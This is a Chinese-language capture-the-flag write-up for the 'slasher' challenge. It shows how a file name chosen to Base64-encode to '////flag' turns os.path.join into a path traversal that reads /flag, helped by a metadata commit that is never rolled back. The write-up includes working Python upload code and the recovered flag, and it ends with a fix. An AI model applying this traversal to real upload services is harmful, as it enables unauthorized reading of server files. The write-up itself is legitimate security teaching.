# slasher

## 题目简述

登录用户可以上传文件并自定义显示文件名。服务把该名称按 Latin-1 编码，再做 Base64，结果同时作为数据库中的 enc_filename 和磁盘文件名。下载时，路由先根据 enc_filename 查询当前用户的数据库记录，再直接把它传给 os.path.join 和 send_file。

题目提示 flag 位于 /flag。问题在于 Base64 字符集本身包含斜杠，而服务把编码结果误当作安全路径组件。

## 解题过程

目标是找一段原始文件名 bytes，使 Base64 编码结果以绝对路径形式出现。字符串“////flag”是合法的 Base64 文本：

~~~python
import base64

raw_name = base64.b64decode(b"////flag")
assert raw_name == b"\xff\xff\xff~V\xa0"
assert base64.b64encode(raw_name) == b"////flag"
~~~

Flask 表单字段是 Unicode，而应用稍后调用 filename.encode("latin-1")。因此客户端应先把这些原始字节按 Latin-1 解码成字符串再提交，保证服务端重新编码时取回同一组字节：

~~~python
raw_name = base64.b64decode(b"////flag")
filename = raw_name.decode("latin-1")

session.post(
    f"{BASE_URL}/upload",
    data={"filename": filename},
    files={"file": ("upload", b"anything")},
)
~~~

上传路由的执行顺序很关键：

1. FileService.add 先把 filename 与 enc_filename 写入数据库并提交。
2. os.path.join 遇到以斜杠开头的“////flag”时丢弃上传目录前缀，解析为 /flag。
3. file.save 尝试覆盖只读 flag，因权限失败返回 500。
4. 数据库记录不会随文件保存失败回滚。

回到首页后，数据库记录会生成：

~~~text
/?filename=////flag
~~~

下载路由先查到这条属于当前用户的记录，随后同样把路径解析为 /flag，send_file 因而读取真实 flag。官方说明曾把参数写成 file，但当前源码实际使用 filename；复现时应以源码为准。

~~~text
shellmates{d3F1Ni73Ly_nOT_uRls4Fe_Base64}
~~~

## 方法总结

Base64 不是文件名净化：标准字母表包含斜杠，解码前后的任一侧都可能制造路径分隔符。文件上传流程还必须保证数据库与文件系统操作原子一致；本题正是利用“先提交元数据、后保存文件、失败不回滚”留下授权记录。修复时应使用服务器生成的安全标识作为磁盘名，并在 join 后验证 realpath 仍位于上传目录。
